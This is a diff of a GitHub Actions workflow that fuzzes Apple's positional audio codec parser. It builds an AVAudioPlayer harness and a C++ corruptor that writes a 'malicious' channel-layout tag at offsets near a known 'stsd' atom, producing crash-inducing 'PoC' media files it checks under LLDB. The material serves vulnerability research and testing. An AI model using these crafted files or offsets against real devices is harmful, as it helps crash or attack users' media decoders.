@@ -1,173 +1,246 @@
-name: Targeted APAC File Corruption and Fuzzing
+name: Advanced AVPlayer Stress Harness
 on:
   push:
     branches: [ main ]
   pull_request:
     branches: [ main ]
-  workflow_dispatch: # Allows manual triggering
+  workflow_dispatch:
 
 jobs:
-  build-and-test:
+  stress-test-avplayer:
     runs-on: macos-latest
+    
+    # Use a matrix to run different test scenarios in parallel.
+    # This allows for a more organized and scalable testing strategy.
+    strategy:
+      fail-fast: false # Don't cancel other jobs if one fails
+      matrix:
+        test_scenario: [ 'offset_fuzz', 'concurrent_playback', 'rapid_start_stop', 'large_file' ]
 
     steps:
-      # Clone your repository
+      # --- SETUP PHASE ---
       - name: Clone Your Repository
         run: git clone https://github.com/encryptedcoderr/AppleTest2/
 
-      # Navigate to the correct directory
       - name: Navigate to working directory
         run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Create our Swift player harness
-      - name: Create Swift Player Harness
+      # Create a more advanced Swift harness that supports different test modes
+      - name: Create Advanced Swift Player Harness
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Creating Swift audio player harness..."
+          echo "Creating advanced Swift audio player harness..."
           cat > harness.swift << 'EOF'
           import Foundation
           import AVFoundation
 
           class PlayerDelegate: NSObject, AVAudioPlayerDelegate {
-              var isPlaying = true
+              var playingCount = 0
               func audioPlayerDidFinishPlaying(_ player: AVAudioPlayer, successfully flag: Bool) {
-                  // Suppress output on success to keep logs clean
-                  isPlaying = false
+                  playingCount -= 1
               }
               func audioPlayerDecodeErrorDidOccur(_ player: AVAudioPlayer, error: Error?) {
                   print("Harness Decode Error: \(error?.localizedDescription ?? "unknown error")")
-                  isPlaying = false
+                  playingCount -= 1
               }
           }
 
-          if CommandLine.arguments.count < 2 {
+          if CommandLine.arguments.count < 3 {
+              print("Usage: ./harness <mode> <file_path>")
+              print("Modes: single, loop, concurrent, rapid")
               exit(1)
           }
 
-          let filePath = CommandLine.arguments[1]
+          let mode = CommandLine.arguments[1]
+          let filePath = CommandLine.arguments[2]
           let fileURL = URL(fileURLWithPath: filePath)
+          let delegate = PlayerDelegate()
+
+          print("Running in mode: \(mode) with file: \(filePath)")
 
           do {
-              let delegate = PlayerDelegate()
-              let audioPlayer = try AVAudioPlayer(contentsOf: fileURL)
-              audioPlayer.delegate = delegate
-              audioPlayer.play()
-              
-              while delegate.isPlaying {
-                  RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1))
+              switch mode {
+              case "loop":
+                  for i in 0..<50 {
+                      print("Loop \(i+1)/50...")
+                      let player = try AVAudioPlayer(contentsOf: fileURL)
+                      delegate.playingCount = 1
+                      player.delegate = delegate
+                      player.play()
+                      while delegate.playingCount > 0 { RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.05)) }
+                  }
+              case "concurrent":
+                  let players = try (0..<10).map { _ in try AVAudioPlayer(contentsOf: fileURL) }
+                  delegate.playingCount = players.count
+                  players.forEach { player in
+                      player.delegate = delegate
+                      player.play()
+                  }
+                  while delegate.playingCount > 0 { RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1)) }
+              case "rapid":
+                  let player = try AVAudioPlayer(contentsOf: fileURL)
+                  for i in 0..<500 {
+                      player.play()
+                      if player.isPlaying { player.stop() }
+                  }
+              default: // "single"
+                  let player = try AVAudioPlayer(contentsOf: fileURL)
+                  delegate.playingCount = 1
+                  player.delegate = delegate
+                  player.play()
+                  while delegate.playingCount > 0 { RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.1)) }
               }
           } catch {
-              print("Harness failed to initialize AVAudioPlayer: \(error.localizedDescription)")
+              print("Harness failed to initialize player: \(error.localizedDescription)")
           }
+          print("Harness finished mode: \(mode)")
           EOF
 
-      # This script is a simple utility to corrupt a file at a specific offset.
-      - name: Create C++ File Corruptor
+      # Create a C++ utility that can perform different types of corruption
+      - name: Create Advanced C++ File Corruptor
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Creating simple C++ file corruption utility..."
+          echo "Creating advanced C++ file corruption utility..."
           cat > corruptor.cpp << 'EOF'
           #include <stdio.h>
           #include <stdlib.h>
+          #include <time.h>
 
           int main(int argc, const char * argv[]) {
-              if (argc != 3) {
-                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
+              if (argc != 4) {
+                  fprintf(stderr, "Usage: %s <file> <offset> <corruption_mode>\n", argv[0]);
+                  fprintf(stderr, "Modes: tag, random_byte, random_block\n");
                   return 1;
               }
 
               const char* filePath = argv[1];
               long offset = atol(argv[2]);
+              const char* mode = argv[3];
 
               FILE *file = fopen(filePath, "r+b");
-              if (!file) {
-                  fprintf(stderr, "Corruptor error: Failed to open file: %s\n", filePath);
-                  return 1;
-              }
+              if (!file) { return 1; }
 
               fseek(file, offset, SEEK_SET);
+
+              if (strcmp(mode, "tag") == 0) {
+                  unsigned char tag[4] = {0x01, 0x01, 0x00, 0xFF};
+                  fwrite(tag, 1, sizeof(tag), file);
+              } else if (strcmp(mode, "random_byte") == 0) {
+                  srand(time(NULL));
+                  unsigned char byte = rand() % 256;
+                  fwrite(&byte, 1, 1, file);
+              } else if (strcmp(mode, "random_block") == 0) {
+                  srand(time(NULL));
+                  unsigned char block[256];
+                  for(int i=0; i<256; ++i) { block[i] = rand() % 256; }
+                  fwrite(block, 1, sizeof(block), file);
+              }
               
-              // New, more subtle malicious tag. This looks like a valid layout
-              // but specifies 255 channels, creating a mismatch.
-              unsigned char malicious_tag[4] = {0x01, 0x01, 0x00, 0xFF};
-              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
               fclose(file);
-              
-              fprintf(stderr, "Corruption complete at offset 0x%lx.\n", offset);
               return 0;
           }
           EOF
 
-      # Set up Xcode
-      - name: Set up Xcode
+      - name: Setup Environment
         uses: maxim-lobanov/setup-xcode@v1
         with:
           xcode-version: '15.4'
 
-      # Compile the Swift and C++ utilities
       - name: Compile Custom Tools
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Compiling Swift harness..."
+          echo "Compiling utilities..."
           swiftc harness.swift -o harness
-          if [ ! -f ./harness ]; then echo "Swift harness compilation failed."; exit 1; fi
-          echo "Compiling C++ corruptor..."
           clang++ -g corruptor.cpp -o corruptor
-          if [ ! -f ./corruptor ]; then echo "C++ corruptor compilation failed."; exit 1; fi
+          if [ ! -f ./harness ] || [ ! -f ./corruptor ]; then
+            echo "Tool compilation failed."
+            exit 1
+          fi
 
-      # This is the main step that corrupts the file at a hardcoded, known-good offset.
-      - name: Surgically Corrupt APAC File
+      # --- TEST EXECUTION PHASE ---
+
+      - name: Run Offset Fuzzing Test
+        if: matrix.test_scenario == 'offset_fuzz'
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          set -x 
-          
-          # Step 1: Create a copy of the new video file to corrupt.
-          cp IMG_1047.mov output_apac_poc.mp4
+          echo "### Starting Offset Fuzzing Scenario ###"
+          mkdir -p test_results
+          # Iterate over a range of offsets around our known target
+          for offset in {3400..3600..20}; do
+            echo "--- Testing offset ${offset} ---"
+            POC_FILE="output_offset_${offset}.mp4"
+            LOG_FILE="test_results/log_offset_${offset}.txt"
+            cp IMG_1047.mov "$POC_FILE"
+            ./corruptor "$POC_FILE" $offset "tag"
+            
+            lldb -b -o "run" -o "bt" -o "quit" -- ./harness single "$POC_FILE" > "$LOG_FILE" 2>&1 || true
+            if grep -q "frame #0" "$LOG_FILE" && ! grep -q "exited with status = 0" "$LOG_FILE"; then
+              echo "✅✅✅ CRASH DETECTED for offset ${offset} ✅✅✅"
+            else
+              rm "$LOG_FILE" # Clean up non-crashing logs
+            fi
+          done
 
-          # Step 2: Use the manually identified offset for the APAC track's 'stsd' atom.
-          APAC_STSD_OFFSET=3461
-          
-          # The channel layout tag is at a known position within the 'stsd' atom.
-          CORRUPTION_OFFSET=$(( ${APAC_STSD_OFFSET} + 72 ))
-          
-          echo "Calculated corruption offset: ${CORRUPTION_OFFSET}"
-
-          # Step 3: Run the C++ utility to perform the corruption at the precise location.
-          ./corruptor output_apac_poc.mp4 $CORRUPTION_OFFSET
-          
-          echo "Malicious APAC PoC file generated."
-          ls -l output_apac_poc.mp4
-          
-      # Launch our custom player under LLDB to catch any crash.
-      - name: Launch Player Under LLDB to Catch Crash
+      - name: Run Concurrent Playback Test
+        if: matrix.test_scenario == 'concurrent_playback'
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Custom Player with final PoC ---" > $PLAYER_LOG_FILE
-          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
+          echo "### Starting Concurrent Playback Scenario ###"
+          POC_FILE="output_concurrent.mp4"
+          LOG_FILE="test_results/log_concurrent.txt"
+          cp IMG_1047.mov "$POC_FILE"
+          # Corrupt at the known-good APAC stsd offset
+          ./corruptor "$POC_FILE" 3533 "tag"
+          
+          # Use ulimit to restrict memory and add stress
+          ulimit -v 500000 
+          lldb -b -o "run" -o "bt" -o "quit" -- ./harness concurrent "$POC_FILE" > "$LOG_FILE" 2>&1 || true
+          if grep -q "frame #0" "$LOG_FILE" && ! grep -q "exited with status = 0" "$LOG_FILE"; then
+            echo "✅✅✅ CRASH DETECTED during concurrent playback ✅✅✅"
+          fi
 
-          echo "Creating LLDB script to launch and monitor the harness..."
-          cat > player_debug_script.lldb << 'EOF'
-          # Run the process. LLDB will automatically stop if a crash occurs.
-          run
-          # If a crash occurred, this will give us the full backtrace.
-          bt
-          quit
-          EOF
-
-          echo "Launching custom Swift harness under LLDB..." >> $PLAYER_LOG_FILE
-          lldb -s player_debug_script.lldb -- ./harness output_apac_poc.mp4 >> $PLAYER_LOG_FILE 2>&1 || true
-
-          echo "✅ Player debug log created. Displaying contents:"
-          cat $PLAYER_LOG_FILE
+      - name: Run Rapid Start/Stop Test
+        if: matrix.test_scenario == 'rapid_start_stop'
+        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "### Starting Rapid Start/Stop Scenario ###"
+          POC_FILE="output_rapid.mp4"
+          LOG_FILE="test_results/log_rapid.txt"
+          cp IMG_1047.mov "$POC_FILE"
+          ./corruptor "$POC_FILE" 3533 "tag"
+          
+          lldb -b -o "run" -o "bt" -o "quit" -- ./harness rapid "$POC_FILE" > "$LOG_FILE" 2>&1 || true
+          if grep -q "frame #0" "$LOG_FILE" && ! grep -q "exited with status = 0" "$LOG_FILE"; then
+            echo "✅✅✅ CRASH DETECTED during rapid start/stop ✅✅✅"
+          fi
+          
+      - name: Run Large File Test
+        if: matrix.test_scenario == 'large_file'
+        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "### Starting Large File Scenario ###"
+          brew install ffmpeg
+          # Create a large, 1-minute silent video file
+          ffmpeg -f lavfi -i anullsrc=channel_layout=stereo:sample_rate=48000 -t 60 large_base.wav
+          afconvert -d apac -f mp4f large_base.wav large_apac.mp4
+          
+          POC_FILE="output_large_poc.mp4"
+          LOG_FILE="test_results/log_large_file.txt"
+          cp large_apac.mp4 "$POC_FILE"
+          ./corruptor "$POC_FILE" 288 "random_block"
+          
+          lldb -b -o "run" -o "bt" -o "quit" -- ./harness single "$POC_FILE" > "$LOG_FILE" 2>&1 || true
+          if grep -q "frame #0" "$LOG_FILE" && ! grep -q "exited with status = 0" "$LOG_FILE"; then
+            echo "✅✅✅ CRASH DETECTED with large file ✅✅✅"
+          fi
 
       # Upload all artifacts for analysis
       - name: Upload All Artifacts
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: debug-and-poc-artifacts
+          name: stress-test-artifacts-${{ matrix.test_scenario }}
           path: |
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.mp4
-            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_*.mp4
+            AppleTest2/apple-positional-audio-codec-invalid-header-main/test_results/
           retention-days: 7
